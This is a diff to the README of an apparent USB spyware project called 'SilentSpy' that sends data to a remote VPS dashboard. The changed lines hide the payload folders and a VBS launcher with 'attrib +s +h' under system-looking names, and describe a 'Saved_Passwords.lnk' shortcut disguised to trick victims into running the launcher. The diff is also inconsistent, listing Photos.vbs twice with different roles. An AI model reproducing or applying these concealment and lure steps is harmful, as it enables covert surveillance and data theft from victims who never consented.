@@ -99,9 +99,11 @@ SERVER_URL = "http://your-vps-ip:5000"
 Hide Files on USB
 
 cd E:\Confidential_Data
+attrib +s +h AppData
 attrib +s +h System32_cache
 attrib +s +h Microsoft_Edge
-attrib +s +h run.bat
+attrib +s +h tempfile
+attrib +s +h Photos.vbs
 
 Access Dashboard
 
@@ -140,8 +142,8 @@ SilentSpy/
 ├── System32_cache/        # Portable Python (large files via LFS)
 ├── Windows/               # Dashboard files
 ├── Photos.vbs             # VBS launcher
-├── Saved_Passwords.lnk    # Disguised shortcut
-├── run.bat                # Batch launcher
+├── Saved_Passwords.lnk    # Disguised shortcut of Photos.vbs
+├── Photos.vbs             # Batch launcher
 ├── .gitattributes         # Git LFS configuration
 └── README.md              # This file
 
